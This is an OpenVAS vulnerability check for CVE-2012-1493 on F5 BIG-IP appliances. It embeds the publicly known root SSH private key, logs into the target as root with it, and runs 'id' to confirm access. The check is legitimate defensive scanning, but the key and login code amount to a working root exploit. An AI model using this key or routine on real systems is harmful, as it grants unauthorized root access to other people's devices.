###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_f5_bigip_ssh_root_auth_bypass.nasl 12 2013-10-27 11:15:33Z jan $
#
# F5 BIG-IP remote root authentication bypass Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "A platform-specific remote root access vulnerability has been discovered that may
allow a remote user to gain privileged access to affected systems using SSH.

The vulnerability is caused by a publicly known SSH private key for the root user
which is present on all vulnerable appliances.

The following platforms are affected by this issue:

    VIPRION B2100, B4100, and B4200
    BIG-IP 520, 540, 1000, 2000, 2400, 5000, 5100, 1600, 3600, 3900, 6900, 8900, 8950, 11000, and 11050
    BIG-IP Virtual Edition
    Enterprise Manager 3000 and 4000";

tag_solution = "Updates are available. See the References for more information.";

if (description)
{
 script_id(103494);
 script_version ("$Revision: 12 $");
 script_bugtraq_id(53897);

 script_name("F5 BIG-IP remote root authentication bypass Vulnerability");
 script_cve_id("CVE-2012-1493");
 script_tag(name:"cvss_base", value:"7.8");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;
 script_xref(name : "URL" , value : "https://www.trustmatta.com/advisories/MATTA-2012-002.txt");
 script_xref(name : "URL" , value : "http://support.f5.com/kb/en-us/solutions/public/13000/600/sol13600.html");

 script_tag(name:"risk_factor", value:"High");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2012-06-14 13:35:33 +0200 (Thu, 14 Jun 2012)");
 script_description(desc);
 script_summary("Determine if it is possible to login as root");
 script_category(ACT_ATTACK);
 script_family("Gain a shell remotely");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("ssh_detect.nasl");
 script_require_ports("Services/ssh", 22);
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("ssh_func.inc");

port = get_kb_item("Services/ssh");
if(!port) port = 22;

if(!get_port_state(port))exit(0);

if(!soc = open_sock_tcp(port))exit(0);

login = 'root';

priv ='-----BEGIN RSA PRIVATE KEY-----
MIICWgIBAAKBgQC8iELmyRPPHIeJ//uLLfKHG4rr84HXeGM+quySiCRgWtxbw4rh
UlP7n4XHvB3ixAKdWfys2pqHD/Hqx9w4wMj9e+fjIpTi3xOdh/YylRWvid3Pf0vk
OzWftKLWbay5Q3FZsq/nwjz40yGW3YhOtpK5NTQ0bKZY5zz4s2L4wdd0uQIBIwKB
gBWL6mOEsc6G6uszMrDSDRbBUbSQ26OYuuKXMPrNuwOynNdJjDcCGDoDmkK2adDF
8auVQXLXJ5poOOeh0AZ8br2vnk3hZd9mnF+uyDB3PO/tqpXOrpzSyuITy5LJZBBv
7r7kqhyBs0vuSdL/D+i1DHYf0nv2Ps4aspoBVumuQid7AkEA+tD3RDashPmoQJvM
2oWS7PO6ljUVXszuhHdUOaFtx60ZOg0OVwnh+NBbbszGpsOwwEE+OqrKMTZjYg3s
37+x/wJBAMBtwmoi05hBsA4Cvac66T1Vdhie8qf5dwL2PdHfu6hbOifSX/xSPnVL
RTbwU9+h/t6BOYdWA0xr0cWcjy1U6UcCQQDBfKF9w8bqPO+CTE2SoY6ZiNHEVNX4
rLf/ycShfIfjLcMA5YAXQiNZisow5xznC/1hHGM0kmF2a8kCf8VcJio5AkBi9p5/
uiOtY5xe+hhkofRLbce05AfEGeVvPM9V/gi8+7eCMa209xjOm70yMnRHIBys8gBU
Ot0f/O+KM0JR0+WvAkAskPvTXevY5wkp5mYXMBlUqEd7R3vGBV/qp4BldW5l0N4G
LesWvIh6+moTbFuPRoQnGO2P6D7Q5sPPqgqyefZS
-----END RSA PRIVATE KEY-----';

pub = 'AAAAB3NzaC1yc2EAAAABIwAAAIEAvIhC5skTzxyHif/7iy3yhxuK6/OB13hjPqrskogkYFrcW8OK4VJT+5+Fx7wd4sQCnVn8rNqahw/x6sfcOMDI/Xvn4yKU4t8TnYf2MpUVr4ndz39L5Ds1n7Si1m2suUNxWbKv58I8+NMhlt2ITraSuTU0NGymWOc8+LNi+MHXdLk=';

login = ssh_login (socket:soc, login:login, password:NULL, pub:pub, priv:priv, passphrase:NULL);

if(login == 0) {

  cmd = ssh_cmd(socket:soc, cmd:"id");
  if("uid=" >< cmd) {
    security_hole(port:port);
    close(soc);
    exit(0);
  }  

}  

close(soc);
